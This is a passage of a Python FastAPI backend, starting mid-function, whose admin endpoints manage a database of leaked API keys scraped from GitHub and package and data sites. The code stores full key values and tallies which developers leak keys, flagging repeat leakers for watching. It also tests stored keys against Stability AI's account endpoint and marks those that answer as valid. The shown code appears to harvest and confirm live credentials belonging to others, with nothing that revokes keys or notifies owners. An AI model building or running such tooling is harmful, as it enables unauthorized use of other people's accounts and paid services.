    _check_admin(authorization)
    global _AUTHOR_CYCLE_RUNNING
    if _AUTHOR_CYCLE_RUNNING:
        return {"ok": False, "error": "cycle already running",
                "last_result": _AUTHOR_CYCLE_LAST_RESULT}

    async def _bg():
        global _AUTHOR_CYCLE_RUNNING, _AUTHOR_CYCLE_LAST_RESULT
        _AUTHOR_CYCLE_RUNNING = True
        try:
            _AUTHOR_CYCLE_LAST_RESULT = await run_author_cycle()
        except Exception as e:
            log.error("manual author cycle err: %s", e)
            _AUTHOR_CYCLE_LAST_RESULT = {"error": str(e)}
        finally:
            _AUTHOR_CYCLE_RUNNING = False

    asyncio.create_task(_bg(), name="manual_author_cycle")
    return {"ok": True, "message": "cycle started in background — poll /admin/author_cycle_status"}


@app.get("/admin/author_cycle_status")
async def admin_author_cycle_status(
    authorization: str | None = Header(default=None),
):
    _check_admin(authorization)
    return {
        "running":     _AUTHOR_CYCLE_RUNNING,
        "last_result": _AUTHOR_CYCLE_LAST_RESULT,
    }


@app.post("/admin/backfill_authors")
async def admin_backfill_authors(
    authorization: str | None = Header(default=None),
):
    """One-time backfill: populate watched_authors from existing found_keys.

    track_leak() only auto-fires on NEW save_key() inserts. Pre-existing
    rows from before that hook was added have no entry in watched_authors.
    This endpoint scans found_keys and aggregates per-author counters,
    auto-promoting any author with leak_count >= 3 to is_watched=1.

    Idempotent: re-running overwrites the rebuilt aggregate.
    """
    _check_admin(authorization)
    import sqlite3
    with sqlite3.connect(DB_PATH) as conn:
        conn.row_factory = sqlite3.Row
        # Clear existing aggregates so re-running is idempotent.
        conn.execute("DELETE FROM watched_authors")
        # Aggregate from found_keys. Skip non-github platform prefixes
        # (postman:/kaggle:/etc) — those have separate `<platform>:<owner>`
        # repo formats and need different parsing logic.
        conn.execute("""
            INSERT INTO watched_authors
                (login, platform, leak_count, valid_count, repos_with_leaks,
                 first_leak_at, last_leak_at, is_watched)
            SELECT
                SUBSTR(repo, 1, INSTR(repo, '/') - 1)         AS login,
                'github'                                      AS platform,
                COUNT(*)                                      AS leak_count,
                COALESCE(SUM(is_valid), 0)                    AS valid_count,
                COUNT(DISTINCT repo)                          AS repos_with_leaks,
                MIN(discovered_at)                            AS first_leak_at,
                MAX(discovered_at)                            AS last_leak_at,
                CASE WHEN COUNT(*) >= 3 THEN 1 ELSE 0 END     AS is_watched
            FROM found_keys
            WHERE repo LIKE '%/%'
              AND repo NOT LIKE 'postman:%'
              AND repo NOT LIKE 'kaggle:%'
              AND repo NOT LIKE 'hf:%'
              AND repo NOT LIKE 'npm:%'
              AND repo NOT LIKE 'pypi:%'
              AND repo NOT LIKE 'cc:%'
              AND repo NOT LIKE 'http%://%'  -- skip URL-style repo strings
              AND repo NOT LIKE 'https:%'
              AND INSTR(repo, '/') > 0
            GROUP BY login, platform
        """)
        # Counts after backfill
        total = conn.execute("SELECT COUNT(*) FROM watched_authors").fetchone()[0]
        watched = conn.execute(
            "SELECT COUNT(*) FROM watched_authors WHERE is_watched=1"
        ).fetchone()[0]
        top = [dict(r) for r in conn.execute("""
            SELECT login, leak_count, valid_count, repos_with_leaks
            FROM watched_authors
            WHERE is_watched=1
            ORDER BY valid_count DESC, leak_count DESC
            LIMIT 10
        """).fetchall() ]
    return {
        "ok": True,
        "total_authors":  total,
        "watched_count":  watched,
        "top_10_watched": top,
    }


@app.post("/admin/backfill_stability")
async def admin_backfill_stability(
    only_dead: bool = True,
    limit: int = 500,
    authorization: str | None = Header(default=None),
):
    """One-time backfill: reclassify openai-classified 48-char keys to
    Stability when they validate against Stability API.

    Background: pre-2026-05, our extract_openai matched `sk-[A-Za-z0-9]{48}`
    without disambiguating from Stability AI keys (same shape). Many old
    rows tagged provider=openai is_valid=0 are actually live Stability
    keys that were never validated against the Stability endpoint.

    For each candidate row:
      1. Probe https://api.stability.ai/v1/user/account with the key
      2. If 200 → reclassify provider=stability, is_valid=1, stamp
         last_validated_at
      3. If non-200 → leave row alone
    """
    _check_admin(authorization)
    import sqlite3
    import re as _re
    from validators import validate_stability
    pat48 = _re.compile(r'^sk-[A-Za-z0-9]{48}$')
    where_dead = "AND is_valid=0" if only_dead else ""
    with sqlite3.connect(DB_PATH) as conn:
        conn.row_factory = sqlite3.Row
        rows = conn.execute(
            f"""SELECT id, key_hash, key_full FROM found_keys
                WHERE provider='openai' {where_dead}
                LIMIT ?""",
            (limit,),
        ).fetchall()
    candidates = [r for r in rows if pat48.match(r["key_full"])]
    reclassified = 0
    skipped = 0
    for row in candidates:
        try:
            if await validate_stability(row["key_full"]):
                with sqlite3.connect(DB_PATH) as conn:
                    conn.execute(
                        """UPDATE found_keys
                           SET provider='stability',
                               is_valid=1,
                               last_validated_at=?
                           WHERE id=?""",
                        (datetime.now(timezone.utc).isoformat(), row["id"]),
                    )
                reclassified += 1
                log.info("[backfill_stability] reclassified id=%s as stability VALID",
                         row["id"])
            else:
                skipped += 1
        except Exception as e:
            log.debug("backfill_stability err id=%s: %s", row["id"], e)
            skipped += 1
    return {
        "ok": True,
        "checked": len(candidates),
        "reclassified": reclassified,
        "skipped_or_failed": skipped,
        "message": f"Reclassified {reclassified} keys from openai → stability",
    }
